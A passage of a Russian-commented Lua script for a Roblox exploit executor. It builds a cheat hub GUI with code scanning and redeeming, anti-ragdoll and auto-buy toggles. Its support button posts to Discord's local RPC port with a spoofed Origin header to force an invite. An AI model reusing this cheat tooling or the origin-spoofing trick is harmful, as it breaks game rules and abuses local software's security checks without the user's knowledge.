redeemCorner.Parent = redeemButton

local bottomRow = Instance.new("Frame")
bottomRow.Size = UDim2.new(1, -24, 0, 30)
bottomRow.Position = UDim2.fromOffset(12, 162)
bottomRow.BackgroundTransparency = 1
bottomRow.Parent = mainFrame

local delayLabel = Instance.new("TextLabel")
delayLabel.Size = UDim2.fromOffset(48, 30)
delayLabel.Position = UDim2.fromOffset(10, 0)
delayLabel.BackgroundTransparency = 1
delayLabel.Font = Enum.Font.GothamBold
delayLabel.Text = "Delay:"
themeReg(delayLabel, "TextColor3", "text")
delayLabel.TextSize = 11
delayLabel.TextXAlignment = Enum.TextXAlignment.Left
delayLabel.Parent = bottomRow

delayBox = Instance.new("TextBox")
delayBox.Size = UDim2.fromOffset(48, 30)
delayBox.Position = UDim2.fromOffset(62, 0)
themeReg(delayBox, "BackgroundColor3", "input")
delayBox.BackgroundTransparency = 0.2
delayBox.BorderSizePixel = 0
delayBox.Text = tostring(delay)
themeReg(delayBox, "TextColor3", "textInput")
delayBox.Font = Enum.Font.GothamBold
delayBox.TextSize = 12
delayBox.TextXAlignment = Enum.TextXAlignment.Center
delayBox.ClearTextOnFocus = false
delayBox.Parent = bottomRow

local delayCorner = Instance.new("UICorner")
delayCorner.CornerRadius = UDim.new(0, 10)
delayCorner.Parent = delayBox

local setButton = Instance.new("TextButton")
setButton.Size = UDim2.fromOffset(70, 30)
setButton.Position = UDim2.new(1, -70, 0, 0)
themeReg(setButton, "BackgroundColor3", "button")
setButton.BorderSizePixel = 0
setButton.Text = "Паставить"
themeReg(setButton, "TextColor3", "textMain")
setButton.Font = Enum.Font.GothamBold
setButton.TextSize = 10
setButton.Parent = bottomRow

local setCorner = Instance.new("UICorner")
setCorner.CornerRadius = UDim.new(0, 10)
setCorner.Parent = setButton

-- ========================= Анимации кнопок =========================

local hoverInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local pressInfo = TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

local function addHover(button, getBase)
    attachClick(button)

    local normalTransparency = button.BackgroundTransparency

    local press = Instance.new("UIScale")
    press.Parent = button

    local function create(object, info, props)
        return TweenService:Create(object, info, props, "animButtons")
    end

    local function base()
        if getBase then
            return getBase()
        end
        return getColor("button"), normalTransparency
    end

    button.MouseEnter:Connect(function()
        create(button, hoverInfo, {
            BackgroundColor3 = getColor("hover"),
            BackgroundTransparency = 0.05
        }):Play()
    end)

    button.MouseLeave:Connect(function()
        local color, transparency = base()
        create(button, hoverInfo, {
            BackgroundColor3 = color,
            BackgroundTransparency = transparency
        }):Play()
        create(press, pressInfo, {Scale = 1}):Play()
    end)

    button.MouseButton1Down:Connect(function()
        create(press, TweenInfo.new(0.08), {Scale = 0.94}):Play()
    end)

    button.MouseButton1Up:Connect(function()
        create(press, pressInfo, {Scale = 1}):Play()
    end)
end

addHover(scanButton, function()
    if scanning then
        return getColor("active"), 0.05
    end
    return getColor("button"), 0.2
end)
addHover(modeButton)
addHover(redeemButton)
addHover(setButton)

-- Плавное закрытие
statusDot.MouseButton1Click:Connect(function()
    hub.stopFeatures()

    scanning = false
    processing = false
    workerScheduled = false
    resetBuffer()
    clearCache()

    local closeTween = TweenService:Create(scale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
        Scale = 0
    }, "animWindow")
    closeTween:Play()
    closeTween.Completed:Wait()
    screenGui:Destroy()
end)

-- ========================= Перетаскивание =========================

local dragging = false
local dragStart
local startPosition

mainFrame.InputBegan:Connect(function(input)
    local inputType = input.UserInputType

    if inputType ~= Enum.UserInputType.MouseButton1
        and inputType ~= Enum.UserInputType.Touch then
        return
    end

    dragging = true
    dragStart = input.Position
    startPosition = mainFrame.Position

    input.Changed:Connect(function()
        if input.UserInputState == Enum.UserInputState.End then
            dragging = false
        end
    end)
end)

UserInputService.InputChanged:Connect(function(input)
    if not dragging then
        return
    end

    local inputType = input.UserInputType

    if inputType ~= Enum.UserInputType.MouseMovement
        and inputType ~= Enum.UserInputType.Touch then
        return
    end

    local delta = input.Position - dragStart

    mainFrame.Position = UDim2.new(
        startPosition.X.Scale,
        startPosition.X.Offset + delta.X,
        startPosition.Y.Scale,
        startPosition.Y.Offset + delta.Y
    )
end)

-- ========================= Логика кнопок =========================

local function setDelay()
    local value = tonumber(delayBox.Text)

    if value and value >= 0 then
        delay = value
        delayBox.Text = tostring(value)
    else
        delayBox.Text = tostring(delay)
    end
end

delayBox.FocusLost:Connect(setDelay)
setButton.MouseButton1Click:Connect(setDelay)

-- Пульсация точки
local dotNormalSize = UDim2.fromOffset(10, 10)
local dotNormalPos = UDim2.new(1, -18, 0, 17)
local dotBigSize = UDim2.fromOffset(14, 14)
local dotBigPos = UDim2.new(1, -20, 0, 15)
local pulseInfo = TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
local pulseToken = 0

local function startPulse()
    if not settings.pulse or not settings.animations then
        return
    end

    pulseToken += 1
    local token = pulseToken

    task.spawn(function()
        while scanning and pulseToken == token do
            local grow = TweenService:Create(statusDot, pulseInfo, {Size = dotBigSize, Position = dotBigPos})
            grow:Play()
            grow.Completed:Wait()

            if not scanning or pulseToken ~= token then
                break
            end

            local shrink = TweenService:Create(statusDot, pulseInfo, {Size = dotNormalSize, Position = dotNormalPos})
            shrink:Play()
            shrink.Completed:Wait()
        end
    end)
end

local function stopPulse()
    pulseToken += 1
    TweenService:Create(statusDot, TweenInfo.new(0.2), {Size = dotNormalSize, Position = dotNormalPos}):Play()
end

-- Кнопка сканирования
local stateInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

function hub.toggleScan()
    scanning = not scanning

    resetBuffer()
    updatePreview()

    if scanning then
        scanButton.Text = "Сканируем Кодик..."
        TweenService:Create(scanButton, stateInfo, {
            BackgroundColor3 = getColor("active"),
            BackgroundTransparency = 0.05
        }):Play()
        TweenService:Create(statusDot, stateInfo, {
            BackgroundColor3 = Color3.fromRGB(80, 200, 120)
        }):Play()

        findControls()
        startPulse()
    else
        scanButton.Text = "Запуск!"
        TweenService:Create(scanButton, stateInfo, {
            BackgroundColor3 = getColor("button"),
            BackgroundTransparency = 0.2
        }):Play()
        TweenService:Create(statusDot, stateInfo, {
            BackgroundColor3 = Color3.fromRGB(255, 90, 95)
        }):Play()

        stopPulse()
    end

    hub.sync()
end

scanButton.MouseButton1Click:Connect(hub.toggleScan)

function hub.cycleMode()
    mode += 1

    if mode > 5 then
        mode = 1
    end

    hub.autoTried = 0
    modeButton.Text = hub.modeText()

    updatePreview()

    if scanning and bufferSize() >= hub.need() then
        scheduleProcess()
    end

    hub.sync()
end

modeButton.MouseButton1Click:Connect(hub.cycleMode)

local function manualRedeem()
    local code = previewBox.Text

    if not validCode(code) then
        return
    end

    if redeem(code) then
        resetBuffer()
        updatePreview()
    end
end

redeemButton.MouseButton1Click:Connect(manualRedeem)

previewBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        manualRedeem()
    end
end)

-- ========================= Панель настроек =========================

local settingsPanel = Instance.new("ScrollingFrame")
settingsPanel.Name = "SettingsPanel"
settingsPanel.Size = UDim2.new(1, 0, 0, 157)
settingsPanel.Position = UDim2.new(0, 0, 1, 0)
settingsPanel.CanvasSize = UDim2.new(0, 0, 0, 394)
settingsPanel.ScrollBarThickness = 3
themeReg(settingsPanel, "BackgroundColor3", "bg")
settingsPanel.BorderSizePixel = 0
settingsPanel.Active = true
settingsPanel.ZIndex = 10
settingsPanel.Parent = mainFrame

local function nextIn(list, value)
    for i, v in ipairs(list) do
        if v == value then
            return list[i % #list + 1]
        end
    end
    return list[1]
end

local function makeRow(index, labelText, getText, onClick)
    local y = 2 + (index - 1) * 30

    local label = Instance.new("TextLabel")
    label.Size = UDim2.fromOffset(130, 26)
    label.Position = UDim2.fromOffset(12, y)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.GothamBold
    label.Text = labelText
    themeReg(label, "TextColor3", "text")
    label.TextSize = 11
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = settingsPanel

    local button = Instance.new("TextButton")
    button.Size = UDim2.fromOffset(110, 26)
    button.Position = UDim2.new(1, -122, 0, y)
    themeReg(button, "BackgroundColor3", "button")
    button.BackgroundTransparency = 0.2
    button.BorderSizePixel = 0
    button.Font = Enum.Font.GothamBold
    button.Text = getText()
    themeReg(button, "TextColor3", "textMain")
    button.TextSize = 10
    button.AutoButtonColor = false
    button.Parent = settingsPanel

    local rowCorner = Instance.new("UICorner")
    rowCorner.CornerRadius = UDim.new(0, 10)
    rowCorner.Parent = button

    addHover(button)

    hub.rows[#hub.rows + 1] = function()
        button.Text = getText()
    end

    button.MouseButton1Click:Connect(function()
        onClick()
        button.Text = getText()
        saveSettings()
    end)
end

local speeds = {0.5, 1, 1.5, 2}
local sizes = {1, 1.15, 1.35, 1.5}
local opacities = {0.05, 0.2, 0.4, 0.6}
local volumes = {0.25, 0.5, 0.75, 1}

makeRow(1, "Анимации", function()
    return settings.animations and "ВКЛ" or "ВЫКЛ"
end, function()
    settings.animations = not settings.animations

    if not settings.animations then
        stopPulse()
    elseif scanning then
        startPulse()
    end
end)

makeRow(2, "Скорость", function()
    return "x" .. tostring(settings.speed)
end, function()
    settings.speed = nextIn(speeds, settings.speed)
end)

makeRow(3, "Пульсация", function()
    return settings.pulse and "ВКЛ" or "ВЫКЛ"
end, function()
    settings.pulse = not settings.pulse

    if settings.pulse and scanning then
        startPulse()
    else
        stopPulse()
    end

    hub.sync()
end)

makeRow(4, "Размер окна", function()
    return tostring(settings.scale)
end, function()
    settings.scale = nextIn(sizes, settings.scale)
    TweenService:Create(scale, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Scale = settings.scale
    }):Play()
end)

makeRow(5, "Прозрачность", function()
    return tostring(settings.transparency)
end, function()
    settings.transparency = nextIn(opacities, settings.transparency)
    TweenService:Create(mainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = settings.transparency
    }):Play()
end)

makeRow(6, "Анимация окна", function()
    return settings.animWindow and "ВКЛ" or "ВЫКЛ"
end, function()
    settings.animWindow = not settings.animWindow
end)

makeRow(7, "Анимация кнопок", function()
    return settings.animButtons and "ВКЛ" or "ВЫКЛ"
end, function()
    settings.animButtons = not settings.animButtons
end)

makeRow(8, "Анимация панелей", function()
    return settings.animPanels and "ВКЛ" or "ВЫКЛ"
end, function()
    settings.animPanels = not settings.animPanels
end)

makeRow(9, "Звук", function()
    return settings.sound and "ВКЛ" or "ВЫКЛ"
end, function()
    settings.sound = not settings.sound
end)

makeRow(10, "Громкость", function()
    return tostring(settings.volume)
end, function()
    settings.volume = nextIn(volumes, settings.volume)
end)

makeRow(11, "Авто-запуск", function()
    return settings.autoUseCode and "ВКЛ" or "ВЫКЛ"
end, function()
    settings.autoUseCode = not settings.autoUseCode
end)

makeRow(12, "Anti Ragdoll", function()
    return hub.antiRagdoll and "ВКЛ" or "ВЫКЛ"
end, function()
    hub.setAntiRagdoll(not hub.antiRagdoll)
    hub.refreshRows()
end)

makeRow(13, "Авто-покупка", function()
    return hub.autoBuy and "ВКЛ" or "ВЫКЛ"
end, function()
    hub.setAutoBuy(not hub.autoBuy)
    hub.refreshRows()
end)

-- ========================= Панель тематик =========================

local SUPPORT_LINK = "https://discord.gg/6UhNkgjhm8"
local SUPPORT_CODE = "6UhNkgjhm8"

local function buildThemePanel()
    local panel = Instance.new("ScrollingFrame")
    panel.Name = "ThemePanel"
    panel.Size = UDim2.new(1, 0, 0, 157)
    panel.CanvasSize = UDim2.new(0, 0, 0, 206)
    panel.ScrollBarThickness = 3
    panel.Position = UDim2.new(0, 0, 1, 0)
    panel.BorderSizePixel = 0
    panel.Active = true
    panel.ZIndex = 10
    panel.Parent = mainFrame
    themeReg(panel, "BackgroundColor3", "bg")

    local header = Instance.new("TextLabel")
    header.Size = UDim2.new(1, -24, 0, 16)
    header.Position = UDim2.fromOffset(12, 5)
    header.BackgroundTransparency = 1
    header.Font = Enum.Font.GothamBold
    header.Text = "Тематика скрипта"
    header.TextSize = 11
    header.TextXAlignment = Enum.TextXAlignment.Left
    header.Parent = panel
    themeReg(header, "TextColor3", "text")

    -- Готовые цвета {оттенок, насыщенность}
    local presets = {
        {0.555, 1}, {0.49, 1}, {0.40, 1}, {0.30, 1},
        {0.20, 1},  {0.14, 1}, {0.07, 1}, {0.00, 1},
        {0.96, 1},  {0.91, 1}, {0.86, 1}, {0.78, 1},
        {0.72, 1},  {0.65, 1}, {0.60, 1}, {0.00, 0},
    }

    local swatches = {}
    local specials = {}

    local hueBar = Instance.new("Frame")
    hueBar.Size = UDim2.new(1, -34, 0, 14)
    hueBar.Position = UDim2.fromOffset(17, 178)
    hueBar.BackgroundColor3 = Color3.new(1, 1, 1)
    hueBar.BorderSizePixel = 0
    hueBar.Parent = panel

    local knob = Instance.new("Frame")
    knob.Size = UDim2.fromOffset(8, 20)
    knob.AnchorPoint = Vector2.new(0.5, 0.5)
    knob.Position = UDim2.new(settings.hue, 0, 0.5, 0)
    knob.BackgroundColor3 = Color3.new(1, 1, 1)
    knob.BorderSizePixel = 0
    knob.ZIndex = 2
    knob.Parent = hueBar

    local function refreshSwatches()
        for _, item in ipairs(swatches) do
            item.stroke.Enabled = settings.theme == "custom"
                and math.abs(settings.hue - item.hue) < 0.005
                and math.abs(settings.sat - item.sat) < 0.005
        end

        for _, item in ipairs(specials) do
            item.stroke.Enabled = settings.theme == item.key
        end
    end

    -- Особые темы
    local specialList = {
        {"dark", "🌑 Чёрная"},
        {"light", "☀️ Белая"},
        {"newyear", "🎄 Новогодняя"},
        {"halloween", "🎃 Хэллоуин"},
    }

    for i, entry in ipairs(specialList) do
        local key, label = entry[1], entry[2]
        local column = (i - 1) % 2
        local row = math.floor((i - 1) / 2)

        local special = Instance.new("TextButton")
        special.Size = UDim2.new(0.5, -21, 0, 26)
        special.Position = UDim2.new(column * 0.5, column == 0 and 17 or 4, 0, 26 + row * 30)
        special.BackgroundColor3 = THEME_PRESETS[key].bar
        special.BorderSizePixel = 0
        special.Font = Enum.Font.GothamBold
        special.Text = label
        special.TextColor3 = key == "light" and THEME_PRESETS[key].text or THEME_PRESETS[key].textMain
        special.TextSize = 10
        special.AutoButtonColor = false
        special.Parent = panel

        local specialCorner = Instance.new("UICorner")
        specialCorner.CornerRadius = UDim.new(0, 10)
        specialCorner.Parent = special

        local specialStroke = Instance.new("UIStroke")
        specialStroke.Thickness = 2
        specialStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        specialStroke.Enabled = false
        specialStroke.Parent = special
        themeReg(specialStroke, "Color", "text")

        specials[#specials + 1] = {key = key, stroke = specialStroke}

        attachClick(special)

        special.MouseButton1Click:Connect(function()
            settings.theme = key

            applyTheme(false)
            hub.refreshXmas()
            refreshSwatches()
            saveSettings()
        end)
    end

    local colorsLabel = Instance.new("TextLabel")
    colorsLabel.Size = UDim2.new(1, -24, 0, 14)
    colorsLabel.Position = UDim2.fromOffset(12, 88)
    colorsLabel.BackgroundTransparency = 1
    colorsLabel.Font = Enum.Font.GothamBold
    colorsLabel.Text = "Цвета"
    colorsLabel.TextSize = 10
    colorsLabel.TextXAlignment = Enum.TextXAlignment.Left
    colorsLabel.Parent = panel
    themeReg(colorsLabel, "TextColor3", "textSub")

    for i, preset in ipairs(presets) do
        local column = (i - 1) % 8
        local row = math.floor((i - 1) / 8)

        local swatch = Instance.new("TextButton")
        swatch.Size = UDim2.fromOffset(28, 22)
        swatch.Position = UDim2.fromOffset(17 + column * 34, 104 + row * 28)
        swatch.BackgroundColor3 = Color3.fromHSV(preset[1], preset[2] * 0.6, 0.85)
        swatch.BorderSizePixel = 0
        swatch.Text = ""
        swatch.AutoButtonColor = false
        swatch.Parent = panel

        local swatchCorner = Instance.new("UICorner")
        swatchCorner.CornerRadius = UDim.new(0, 8)
        swatchCorner.Parent = swatch

        local swatchStroke = Instance.new("UIStroke")
        swatchStroke.Thickness = 2
        swatchStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        swatchStroke.Enabled = false
        swatchStroke.Parent = swatch
        themeReg(swatchStroke, "Color", "text")

        swatches[#swatches + 1] = {hue = preset[1], sat = preset[2], stroke = swatchStroke}

        attachClick(swatch)

        swatch.MouseButton1Click:Connect(function()
            settings.theme = "custom"
            settings.hue = preset[1]
            settings.sat = preset[2]
            knob.Position = UDim2.new(settings.hue, 0, 0.5, 0)

            applyTheme(false)
            hub.refreshXmas()
            refreshSwatches()
            saveSettings()
        end)
    end

    refreshSwatches()

    -- Ползунок оттенка (радуга)
    local hueLabel = Instance.new("TextLabel")
    hueLabel.Size = UDim2.new(1, -24, 0, 14)
    hueLabel.Position = UDim2.fromOffset(12, 162)
    hueLabel.BackgroundTransparency = 1
    hueLabel.Font = Enum.Font.GothamBold
    hueLabel.Text = "Свой оттенок"
    hueLabel.TextSize = 10
    hueLabel.TextXAlignment = Enum.TextXAlignment.Left
    hueLabel.Parent = panel
    themeReg(hueLabel, "TextColor3", "textSub")

    local hueCorner = Instance.new("UICorner")
    hueCorner.CornerRadius = UDim.new(1, 0)
    hueCorner.Parent = hueBar

    local keypoints = {}
    for i = 0, 6 do
        keypoints[#keypoints + 1] = ColorSequenceKeypoint.new(i / 6, Color3.fromHSV(i / 6, 0.6, 0.95))
    end

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new(keypoints)
    gradient.Parent = hueBar

    local knobCorner = Instance.new("UICorner")
    knobCorner.CornerRadius = UDim.new(0, 4)
    knobCorner.Parent = knob

    local knobStroke = Instance.new("UIStroke")
    knobStroke.Thickness = 1.5
    knobStroke.Parent = knob
    themeReg(knobStroke, "Color", "text")

    local hueDragging = false

    local function setHueFromX(x)
        local width = hueBar.AbsoluteSize.X

        if width <= 0 then
            return
        end

        local value = math.clamp((x - hueBar.AbsolutePosition.X) / width, 0, 1)

        settings.theme = "custom"
        settings.hue = value
        settings.sat = 1
        knob.Position = UDim2.new(value, 0, 0.5, 0)

        applyTheme(true)
        hub.refreshXmas()
        refreshSwatches()
    end

    hueBar.InputBegan:Connect(function(input)
        local inputType = input.UserInputType

        if inputType == Enum.UserInputType.MouseButton1
            or inputType == Enum.UserInputType.Touch then

            hueDragging = true
            setHueFromX(input.Position.X)
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if not hueDragging then
            return
        end

        local inputType = input.UserInputType

        if inputType == Enum.UserInputType.MouseMovement
            or inputType == Enum.UserInputType.Touch then

            setHueFromX(input.Position.X)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if not hueDragging then
            return
        end

        local inputType = input.UserInputType

        if inputType == Enum.UserInputType.MouseButton1
            or inputType == Enum.UserInputType.Touch then

            hueDragging = false
            saveSettings()
        end
    end)

    return panel
end

local themePanel = buildThemePanel()

-- ========================= Переключение панелей =========================

local settingsOpen = false
local themeOpen = false
local panelInfo = TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

local function showPanel(panel, open)
    TweenService:Create(panel, panelInfo, {
        Position = open and UDim2.new(0, 0, 0, 48) or UDim2.new(0, 0, 1, 0)
    }, "animPanels"):Play()
end

gearButton.MouseButton1Click:Connect(function()
    settingsOpen = not settingsOpen

    if settingsOpen and themeOpen then
        themeOpen = false
        showPanel(themePanel, false)
    end

    showPanel(settingsPanel, settingsOpen)
end)

themeButton.MouseButton1Click:Connect(function()
    themeOpen = not themeOpen

    if themeOpen and settingsOpen then
        settingsOpen = false
        showPanel(settingsPanel, false)
    end

    showPanel(themePanel, themeOpen)
end)

-- ========================= Окно поддержки =========================
do
    local supportFrame = Instance.new("Frame")
    supportFrame.Name = "SupportFrame"
    supportFrame.Size = UDim2.fromOffset(280, 160)
    supportFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    supportFrame.Position = UDim2.fromScale(0.5, 0.55)
    supportFrame.BorderSizePixel = 0
    supportFrame.Visible = false
    supportFrame.Parent = screenGui
    themeReg(supportFrame, "BackgroundColor3", "bg")
    supportFrame.BackgroundTransparency = settings.transparency

    local supportScale = Instance.new("UIScale")
    supportScale.Scale = 1.2
    supportScale.Parent = supportFrame

    local supportFrameCorner = Instance.new("UICorner")
    supportFrameCorner.CornerRadius = UDim.new(0, 14)
    supportFrameCorner.Parent = supportFrame

    local supportFrameStroke = Instance.new("UIStroke")
    supportFrameStroke.Thickness = 1.5
    supportFrameStroke.Parent = supportFrame
    themeReg(supportFrameStroke, "Color", "stroke")

    local supportHeader = Instance.new("Frame")
    supportHeader.Size = UDim2.new(1, 0, 0, 30)
    supportHeader.BorderSizePixel = 0
    supportHeader.BackgroundTransparency = 0.2
    supportHeader.Parent = supportFrame
    themeReg(supportHeader, "BackgroundColor3", "bar")

    local supportHeaderCorner = Instance.new("UICorner")
    supportHeaderCorner.CornerRadius = UDim.new(0, 14)
    supportHeaderCorner.Parent = supportHeader

    local supportTitle = Instance.new("TextLabel")
    supportTitle.Size = UDim2.new(1, -50, 1, 0)
    supportTitle.Position = UDim2.fromOffset(12, 0)
    supportTitle.BackgroundTransparency = 1
    supportTitle.Font = Enum.Font.GothamBold
    supportTitle.Text = "💬 ПОДДЕРЖКА"
    supportTitle.TextSize = 14
    supportTitle.TextXAlignment = Enum.TextXAlignment.Left
    supportTitle.Parent = supportHeader
    themeReg(supportTitle, "TextColor3", "text")

    local supportClose = Instance.new("TextButton")
    supportClose.Size = UDim2.fromOffset(18, 18)
    supportClose.Position = UDim2.new(1, -26, 0, 6)
    supportClose.BorderSizePixel = 0
    supportClose.Font = Enum.Font.GothamBold
    supportClose.Text = "X"
    supportClose.TextSize = 12
    supportClose.AutoButtonColor = false
    supportClose.Parent = supportHeader
    themeReg(supportClose, "BackgroundColor3", "hover")
    themeReg(supportClose, "TextColor3", "textMain")

    local supportCloseCorner = Instance.new("UICorner")
    supportCloseCorner.CornerRadius = UDim.new(1, 0)
    supportCloseCorner.Parent = supportClose

    local supportInfo = Instance.new("TextLabel")
    supportInfo.Size = UDim2.new(1, -24, 0, 66)
    supportInfo.Position = UDim2.fromOffset(12, 36)
    supportInfo.BackgroundTransparency = 1
    supportInfo.Font = Enum.Font.Gotham
    supportInfo.Text = "Вопросы, баги и идеи — заходи в наш Discord:\n" .. SUPPORT_LINK
    supportInfo.TextSize = 13
    supportInfo.TextWrapped = true
    supportInfo.TextXAlignment = Enum.TextXAlignment.Left
    supportInfo.TextYAlignment = Enum.TextYAlignment.Top
    supportInfo.Parent = supportFrame
    themeReg(supportInfo, "TextColor3", "textSub")

    local supportButton = Instance.new("TextButton")
    supportButton.Size = UDim2.new(1, -24, 0, 34)
    supportButton.Position = UDim2.fromOffset(12, 112)
    supportButton.BorderSizePixel = 0
    supportButton.Font = Enum.Font.GothamBold
    supportButton.Text = "📋 Скопировать ссылку"
    supportButton.TextSize = 14
    supportButton.AutoButtonColor = false
    supportButton.Parent = supportFrame
    themeReg(supportButton, "BackgroundColor3", "button")
    themeReg(supportButton, "TextColor3", "textMain")

    local supportButtonCorner = Instance.new("UICorner")
    supportButtonCorner.CornerRadius = UDim.new(0, 10)
    supportButtonCorner.Parent = supportButton

    addHover(supportButton)
    attachClick(supportClose)

    local supportToken = 0

    supportButton.MouseButton1Click:Connect(function()
        local copied = false

        -- Roblox не даёт открыть браузер из скрипта, поэтому копируем ссылку
        pcall(function()
            local copy = setclipboard or toclipboard

            if copy then
                copy(SUPPORT_LINK)
                copied = true
            end
        end)

        -- Пытаемся открыть приглашение в клиенте Discord (если он запущен)
        task.spawn(function()
            pcall(function()
                local httpRequest = (syn and syn.request)
                    or (http and http.request)
                    or http_request
                    or request

                if httpRequest then
                    httpRequest({
                        Url = "http://127.0.0.1:6463/rpc?v=1",
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json",
                            ["Origin"] = "https://discord.com",
                        },
                        Body = HttpService:JSONEncode({
                            cmd = "INVITE_BROWSER",
                            args = {code = SUPPORT_CODE},
                            nonce = HttpService:GenerateGUID(false),
                        }),
                    })
                end
            end)
        end)

        supportToken += 1
        local token = supportToken

        supportButton.Text = copied and "✅ Ссылка скопирована!" or "Ссылка выше ☝️"

        task.delay(2.5, function()
            if supportToken == token then
                supportButton.Text = "📋 Скопировать ссылку"
            end
        end)
    end)

    supportClose.MouseButton1Click:Connect(function()
        supportFrame.Visible = false
    end)

    -- Перетаскивание за заголовок
    local dragging2 = false
    local dragStart2
    local startPos2

    supportHeader.InputBegan:Connect(function(input)
        local t = input.UserInputType

        if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
            dragging2 = true
            dragStart2 = input.Position
            startPos2 = supportFrame.Position
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if not dragging2 then
            return
        end

        local t = input.UserInputType

        if t == Enum.UserInputType.MouseMovement or t == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart2

            supportFrame.Position = UDim2.new(
                startPos2.X.Scale, startPos2.X.Offset + delta.X,
                startPos2.Y.Scale, startPos2.Y.Offset + delta.Y
            )
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        local t = input.UserInputType

        if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
            dragging2 = false
        end
    end)

    -- Кнопка в верхней панели главного окна
    local supportTopButton = Instance.new("TextButton")
    supportTopButton.Size = UDim2.fromOffset(18, 18)
    supportTopButton.Position = UDim2.new(1, -158, 0, 13)
    supportTopButton.BorderSizePixel = 0
    supportTopButton.Text = "💬"
    supportTopButton.Font = Enum.Font.GothamBold
    supportTopButton.TextSize = 12
    supportTopButton.AutoButtonColor = false
    supportTopButton.Parent = topBar
    themeReg(supportTopButton, "BackgroundColor3", "hover")
    themeReg(supportTopButton, "TextColor3", "textMain")

    local supportTopCorner = Instance.new("UICorner")
    supportTopCorner.CornerRadius = UDim.new(1, 0)
    supportTopCorner.Parent = supportTopButton

    attachClick(supportTopButton)

    supportTopButton.MouseButton1Click:Connect(function()
        supportFrame.Visible = not supportFrame.Visible
    end)
end

-- ========================= Тестовый отправитель (локальное объявление) =========================
-- Видно только тебе: никому другому ничего не отправляется.
do
    local ANNOUNCE_ICON = "📢"
    local SHOW_TIME = 4

    -- Баннер сверху экрана
    local banner = Instance.new("TextLabel")
    banner.Name = "LocalAnnouncement"
    banner.AnchorPoint = Vector2.new(0.5, 0)
    banner.Position = UDim2.new(0.5, 0, 0, 30)
    banner.Size = UDim2.new(0.8, 0, 0, 50)
    banner.BackgroundTransparency = 1
    banner.Font = Enum.Font.GothamBlack
    banner.TextSize = 34
    banner.TextColor3 = Color3.new(1, 1, 1)
    banner.TextTransparency = 1
    banner.TextStrokeColor3 = Color3.new(0, 0, 0)
    banner.TextStrokeTransparency = 1
    banner.TextWrapped = true
    banner.Visible = false
    banner.ZIndex = 50
    banner.Parent = screenGui

    local bannerToken = 0
    local fadeIn = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local fadeOut = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)

    local function showBanner(text)
        bannerToken += 1
        local token = bannerToken

        banner.Text = ANNOUNCE_ICON .. " " .. text
        banner.Position = UDim2.new(0.5, 0, 0, 10)
        banner.TextTransparency = 1
        banner.TextStrokeTransparency = 1
        banner.Visible = true

        TweenService:Create(banner, fadeIn, {
            Position = UDim2.new(0.5, 0, 0, 30),
            TextTransparency = 0,
            TextStrokeTransparency = 0,
        }, "animPanels"):Play()

        task.delay(SHOW_TIME, function()
            if bannerToken ~= token or not banner.Parent then
                return
            end

            TweenService:Create(banner, fadeOut, {
                TextTransparency = 1,
                TextStrokeTransparency = 1,
            }, "animPanels"):Play()

            task.delay(0.45, function()
                if bannerToken == token and banner.Parent then
                    banner.Visible = false
                end
            end)
        end)
    end

    -- Даём MrBloxify доступ к баннеру
    hub.showBanner = showBanner

    -- Окно «TEST SENDER»
    local senderFrame = Instance.new("Frame")
    senderFrame.Name = "SenderFrame"
    senderFrame.Size = UDim2.fromOffset(240, 122)
    senderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    senderFrame.Position = UDim2.fromScale(0.5, 0.35)
    senderFrame.BorderSizePixel = 0
    senderFrame.Visible = false
    senderFrame.Parent = screenGui
    themeReg(senderFrame, "BackgroundColor3", "bg")
    senderFrame.BackgroundTransparency = settings.transparency

    local senderScale = Instance.new("UIScale")
    senderScale.Scale = 1.2
    senderScale.Parent = senderFrame

    local senderCorner = Instance.new("UICorner")
    senderCorner.CornerRadius = UDim.new(0, 14)
    senderCorner.Parent = senderFrame

    local senderStroke = Instance.new("UIStroke")
    senderStroke.Thickness = 1.5
    senderStroke.Parent = senderFrame
    themeReg(senderStroke, "Color", "stroke")

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 30)
    header.BorderSizePixel = 0
    header.BackgroundTransparency = 0.2
    header.Parent = senderFrame
    themeReg(header, "BackgroundColor3", "bar")

    local headerCorner = Instance.new("UICorner")
    headerCorner.CornerRadius = UDim.new(0, 14)
    headerCorner.Parent = header

    local senderTitle = Instance.new("TextLabel")
    senderTitle.Size = UDim2.new(1, -50, 1, 0)
    senderTitle.Position = UDim2.fromOffset(12, 0)
    senderTitle.BackgroundTransparency = 1
    senderTitle.Font = Enum.Font.GothamBold
    senderTitle.Text = "TEST SENDER"
    senderTitle.TextSize = 11
    senderTitle.TextXAlignment = Enum.TextXAlignment.Left
    senderTitle.Parent = header
    themeReg(senderTitle, "TextColor3", "text")

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.fromOffset(18, 18)
